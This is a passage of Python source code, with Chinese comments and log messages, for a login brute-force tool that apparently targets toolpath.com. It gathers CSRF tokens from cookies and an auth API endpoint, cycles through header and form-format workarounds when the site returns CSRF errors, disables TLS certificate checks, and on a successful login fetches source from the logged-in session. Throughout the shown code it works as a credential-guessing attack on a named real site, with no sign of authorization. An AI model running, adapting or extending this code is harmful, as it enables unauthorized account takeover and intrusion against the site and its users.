                    print(f"[INFO] 从cookie获取到CSRF token: {csrf_from_cookie[:20]}...")
                    break
            
            # 方法2: 从Next.js csrf token cookie获取
            nextauth_csrf = None
            for cookie in self.session.cookies:
                if 'csrf-token' in cookie.name.lower():
                    # Next.js的CSRF token通常格式为 token|hash，我们只需要token部分
                    nextauth_csrf = cookie.value.split('|')[0] if '|' in cookie.value else cookie.value
                    print(f"[INFO] 从Next.js cookie获取到CSRF token: {nextauth_csrf[:20]}...")
                    break
            
            # 方法3: 从API端点获取（作为备选）
            api_csrf_token = None
            csrf_url = urljoin(self.base_url, '/api/auth/csrf')
            print(f"[DEBUG] 尝试从API端点获取CSRF: {csrf_url}")
            
            headers = self.headers.copy()
            headers.update({
                'Accept': 'application/json, text/plain, */*',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': self.url,
                'Origin': self.base_url
            })
            
            response = self.session.get(csrf_url, headers=headers, verify=False)
            print(f"[DEBUG] API CSRF响应状态: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'csrfToken' in data:
                        api_csrf_token = data['csrfToken']
                        print(f"[INFO] 从API端点获取到CSRF token: {api_csrf_token[:20]}...")
                except json.JSONDecodeError:
                    pass
            
            # 选择最优的token（优先级：cookie > next.js > api > original）
            chosen_token = None
            token_source = ""
            
            if csrf_from_cookie and csrf_from_cookie != self.original_csrf_token:
                chosen_token = csrf_from_cookie
                token_source = "cookie"
            elif nextauth_csrf and nextauth_csrf != self.original_csrf_token:
                chosen_token = nextauth_csrf
                token_source = "next.js cookie"
            elif api_csrf_token and api_csrf_token != self.original_csrf_token:
                chosen_token = api_csrf_token
                token_source = "API endpoint"
            elif csrf_from_cookie:
                chosen_token = csrf_from_cookie
                token_source = "cookie (same as original)"
            elif nextauth_csrf:
                chosen_token = nextauth_csrf
                token_source = "next.js cookie (same as original)"
            elif api_csrf_token:
                chosen_token = api_csrf_token
                token_source = "API endpoint (same as original)"
            elif self.original_csrf_token:
                chosen_token = self.original_csrf_token
                token_source = "original token"
            
            if chosen_token:
                print(f"[INFO] 选择使用来源为 {token_source} 的CSRF token: {chosen_token[:20]}...")
                return chosen_token
            else:
                print("[WARNING] 无法获取任何有效的CSRF token")
                return None
                
        except Exception as e:
            print(f"[ERROR] toolpath CSRF获取失败: {e}")
            if self.original_csrf_token:
                print(f"[INFO] 使用原始token作为备选: {self.original_csrf_token[:20]}...")
                return self.original_csrf_token
            return None

    def send(self, params, param_type=""):
        print(f"[DEBUG] 发送请求到: {self.send_url}")
        print(f"[DEBUG] 请求方法: POST")
        print(f"[DEBUG] 参数类型: {param_type}")
        print(f"[DEBUG] 请求参数: {params}")
        
        # 针对toolpath.com的特殊处理
        is_toolpath = 'toolpath.com' in self.base_url
        
        if param_type == "json":
            # 为JSON请求设置正确的Content-Type和其他必要头部
            headers = self.headers.copy()
            headers.update({
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': self.url,  # 添加Referer头
                'Origin': self.base_url,  # 添加Origin头
            })
            
            # 针对toolpath的特殊头部处理
            if is_toolpath:
                headers.update({
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                })
                
                # 对于toolpath，尝试多种CSRF token设置方式
                if 'csrf' in params:
                    csrf_token = params['csrf']
                    headers['X-CSRF-Token'] = csrf_token
                    headers['X-CSRF-TOKEN'] = csrf_token  # 尝试大写版本
                    headers['CSRF-Token'] = csrf_token    # 尝试无X前缀版本
                    
                    # 尝试从cookie中获取CSRF并同时在多个地方设置
                    for cookie in self.session.cookies:
                        if cookie.name == 'csrf':
                            headers['X-CSRF-Token'] = cookie.value
                            print(f"[DEBUG] 使用cookie中的CSRF token: {cookie.value[:20]}...")
                            break
                        elif 'csrf-token' in cookie.name.lower():
                            csrf_from_cookie = cookie.value.split('|')[0] if '|' in cookie.value else cookie.value
                            headers['X-CSRF-Token'] = csrf_from_cookie
                            print(f"[DEBUG] 使用Next.js cookie中的CSRF token: {csrf_from_cookie[:20]}...")
                            break
                    
                    # 创建一个新的参数副本，可能需要调整参数结构
                    toolpath_params = params.copy()
                    # 对于toolpath，可能需要移除csrf字段，只在header中传递
                    if 'allowUnsecureIframe' in toolpath_params:
                        # 确保这个字段是布尔值而非字符串
                        toolpath_params['allowUnsecureIframe'] = False
                    
                    print(f"[DEBUG] toolpath特殊参数: {toolpath_params}")
                    response = self.session.post(self.send_url, json=toolpath_params, headers=headers, verify=False)
                else:
                    response = self.session.post(self.send_url, json=params, headers=headers, verify=False)
            else:
                # 非toolpath站点的标准处理
                if 'csrf' in params:
                    headers['X-CSRF-Token'] = params['csrf']
                response = self.session.post(self.send_url, json=params, headers=headers, verify=False)
                
            print(f"[DEBUG] 请求头: {headers}")
        else:
            # 为普通表单请求也添加必要的头部
            headers = self.headers.copy()
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': self.url,
                'Origin': self.base_url,
            })
            
            if 'csrf' in params:
                headers['X-CSRF-Token'] = params['csrf']
                
            print(f"[DEBUG] 请求头: {headers}")
            response = self.session.post(self.send_url, data=params, headers=headers, verify=False)
        
        print(f"[DEBUG] 响应状态: {response.status_code}")
        print(f"[DEBUG] 响应内容前200字符: {response.text[:200]}")
        
        # 如果是toolpath且仍然有CSRF错误，尝试备选方案
        if is_toolpath and response.status_code == 400 and "CSRF" in response.text:
            print("[DEBUG] toolpath CSRF错误，尝试备选方案...")
            
            # 备选方案：尝试不同的参数组合
            if param_type == "json" and 'csrf' in params:
                # 方案1：完全移除csrf字段，只在header中传递
                backup_params = {k: v for k, v in params.items() if k != 'csrf'}
                print(f"[DEBUG] 备选方案1 - 移除csrf字段: {backup_params}")
                
                backup_response = self.session.post(self.send_url, json=backup_params, headers=headers, verify=False)
                if backup_response.status_code != 400 or "CSRF" not in backup_response.text:
                    print("[DEBUG] 备选方案1成功")
                    return backup_response
                
                # 方案2：使用form data而非JSON
                print("[DEBUG] 尝试备选方案2 - 使用form data")
                form_headers = headers.copy()
                form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                backup_response = self.session.post(self.send_url, data=params, headers=form_headers, verify=False)
                if backup_response.status_code != 400 or "CSRF" not in backup_response.text:
                    print("[DEBUG] 备选方案2成功")
                    return backup_response
        
        return response

    def check_response(self, response):
        print(f"[DEBUG] 响应状态码: {response.status_code}")
        print(f"[DEBUG] 响应头: {dict(response.headers)}")
        print(f"[DEBUG] 响应长度: {len(response.text)}")
        
        # 首先检查是否登录成功
        is_success, redirect_path = self.check_login_success(response)
        if is_success:
            print(f"[SUCCESS] 检测到登录成功响应！")
            if redirect_path:
                print(f"[INFO] 检测到重定向路径: {redirect_path}")
            self.fetch_source_after_login(redirect_path)
            return 0  # 成功登录后停止爆破
        
        if response.status_code != 200:
            print(f"[ERROR] 请求失败，响应码: {response.status_code}")
            print(f"[ERROR] 响应内容: {response.text[:500]}")  # 显示前500个字符
            if response.status_code == 400:
                print("[INFO] 400错误通常表示请求参数格式不正确，可能是CSRF token过期或参数格式问题")
                if "CSRF" in response.text:
                    print("[INFO] 检测到CSRF相关错误")
                if "token" in response.text.lower():
                    print("[INFO] 响应中提到token相关问题")
            elif response.status_code == 403:
                print("[INFO] 403错误可能表示CSRF保护或权限问题")
            elif response.status_code == 422:
                print("[INFO] 422错误通常表示请求数据验证失败")
            print("停止爆破。")
            return 0
        
        # 检查响应是否包含错误信息但状态码是200  
        if "CSRF" in response.text:
            print(f"[WARNING] 响应中检测到CSRF错误信息: {response.text}")
            # 对于toolpath.com，不立即停止程序，让重试机制处理
            if 'toolpath.com' not in getattr(self, 'base_url', ''):
                return 0
            # 对于toolpath，让调用者决定是否继续
            
        if len(response.text) > 1000:
            print(f"[ERROR] 登陆接口调用失败: 响应码：{response.status_code}，响应过长，可能重定向到其他页面")
            print(f"[ERROR] 响应内容前500字符: {response.text[:500]}")
            print("停止爆破。")
            return 0
